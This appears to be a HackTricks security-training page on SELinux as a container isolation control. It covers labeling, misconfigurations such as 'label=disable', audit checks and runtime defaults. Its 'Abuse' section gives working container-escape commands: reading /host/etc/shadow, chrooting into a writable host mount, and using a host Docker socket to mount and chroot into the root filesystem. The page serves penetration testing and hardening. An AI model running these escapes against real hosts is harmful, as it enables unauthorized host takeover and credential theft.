# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

SELinux is a **label-based Mandatory Access Control** system. Every relevant process and object may carry a security context, and policy decides which domains may interact with which types and in what way. In containerized environments, this usually means that the runtime launches the container process under a confined container domain and labels the container content with corresponding types. If the policy is working properly, the process may be able to read and write the things its label is expected to touch while being denied access to other host content, even if that content becomes visible through a mount.

This is one of the most powerful host-side protections available in mainstream Linux container deployments. It is especially important on Fedora, RHEL, CentOS Stream, OpenShift, and other SELinux-centric ecosystems. In those environments, a reviewer who ignores SELinux will often misunderstand why an obvious-looking path to host compromise is actually blocked.

## AppArmor Vs SELinux

The easiest high-level difference is that AppArmor is path-based while SELinux is **label-based**. That has big consequences for container security. A path-based policy may behave differently if the same host content becomes visible under an unexpected mount path. A label-based policy instead asks what the object's label is and what the process domain may do to it. This does not make SELinux simple, but it does make it robust against a class of path-trick assumptions that defenders sometimes accidentally make in AppArmor-based systems.

Because the model is label-oriented, container volume handling and relabeling decisions are security-critical. If the runtime or operator changes labels too broadly to "make mounts work", the policy boundary that was supposed to contain the workload may become much weaker than intended.

## Lab

To see whether SELinux is active on the host:

```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```

To inspect existing labels on the host:

```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```

To compare a normal run with one where labeling is disabled:

```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```

On an SELinux-enabled host, this is a very practical demonstration because it shows the difference between a workload running under the expected container domain and one that has been stripped of that enforcement layer.

## Runtime Usage

Podman is particularly well aligned with SELinux on systems where SELinux is part of the platform default. Rootless Podman plus SELinux is one of the strongest mainstream container baselines because the process is already unprivileged on the host side and is still confined by MAC policy. Docker can also use SELinux where supported, although administrators sometimes disable it to work around volume-labeling friction. CRI-O and OpenShift rely heavily on SELinux as part of their container isolation story. Kubernetes can expose SELinux-related settings too, but their value obviously depends on whether the node OS actually supports and enforces SELinux.

The recurring lesson is that SELinux is not an optional garnish. In the ecosystems that are built around it, it is part of the expected security boundary.

## Misconfigurations

The classic mistake is `label=disable`. Operationally, this often happens because a volume mount was denied and the quickest short-term answer was to remove SELinux from the equation instead of fixing the labeling model. Another common mistake is incorrect relabeling of host content. Broad relabel operations may make the application work, but they can also expand what the container is allowed to touch far beyond what was originally intended.

It is also important not to confuse **installed** SELinux with **effective** SELinux. A host may support SELinux and still be in permissive mode, or the runtime may not be launching the workload under the expected domain. In those cases the protection is much weaker than the documentation might suggest.

## Abuse

When SELinux is absent, permissive, or broadly disabled for the workload, host-mounted paths become much easier to abuse. The same bind mount that would otherwise have been constrained by labels may become a direct avenue to host data or host modification. This is especially relevant when combined with writable volume mounts, container runtime directories, or operational shortcuts that exposed sensitive host paths for convenience.

SELinux often explains why a generic breakout writeup works immediately on one host but fails repeatedly on another even though the runtime flags look similar. The missing ingredient is frequently not a namespace or a capability at all, but a label boundary that stayed intact.

The fastest practical check is to compare the active context and then probe mounted host paths or runtime directories that would normally be label-confined:

```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```

If a host bind mount is present and SELinux labeling has been disabled or weakened, information disclosure often comes first:

```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```

If the mount is writable and the container is effectively host-root from the kernel's point of view, the next step is to test controlled host modification rather than guessing:

```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```

On SELinux-capable hosts, losing labels around runtime state directories can also expose direct privilege-escalation paths:

```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```

These commands do not replace a full escape chain, but they make it clear very quickly whether SELinux is what was preventing host data access or host-side file modification.

### Full Example: SELinux Disabled + Writable Host Mount

If SELinux labeling is disabled and the host filesystem is mounted writable at `/host`, a full host escape becomes a normal bind-mount abuse case:

```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

If the `chroot` succeeds, the container process is now operating from the host filesystem:

```bash
id
hostname
cat /etc/passwd | tail
```

### Full Example: SELinux Disabled + Runtime Directory

If the workload can reach a runtime socket once labels are disabled, the escape can be delegated to the runtime:

```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```

The relevant observation is that SELinux often was the control preventing exactly this kind of host-path or runtime-state access.

## Checks

The goal of the SELinux checks is to confirm that SELinux is enabled, identify the current security context, and see whether the files or paths you care about are actually label-confined.

```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```

What is interesting here:

- `getenforce` should ideally return `Enforcing`; `Permissive` or `Disabled` changes the meaning of the whole SELinux section.
- If the current process context looks unexpected or too broad, the workload may not be running under the intended container policy.
- If host-mounted files or runtime directories have labels that the process can access too freely, bind mounts become much more dangerous.

When reviewing a container on an SELinux-capable platform, do not treat labeling as a secondary detail. In many cases it is one of the main reasons the host is not already compromised.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Host-dependent | SELinux separation is available on SELinux-enabled hosts, but the exact behavior depends on host/daemon configuration | `--security-opt label=disable`, broad relabeling of bind mounts, `--privileged` |
| Podman | Commonly enabled on SELinux hosts | SELinux separation is a normal part of Podman on SELinux systems unless disabled | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Not generally assigned automatically at Pod level | SELinux support exists, but Pods usually need `securityContext.seLinuxOptions` or platform-specific defaults; runtime and node support are required | weak or broad `seLinuxOptions`, running on permissive/disabled nodes, platform policies that disable labeling |
| CRI-O / OpenShift style deployments | Commonly relied on heavily | SELinux is often a core part of the node isolation model in these environments | custom policies that over-broaden access, disabling labeling for compatibility |

SELinux defaults are more distribution-dependent than seccomp defaults. On Fedora/RHEL/OpenShift-style systems, SELinux is often central to the isolation model. On non-SELinux systems, it is simply absent.
{{#include ../../../../banners/hacktricks-training.md}}
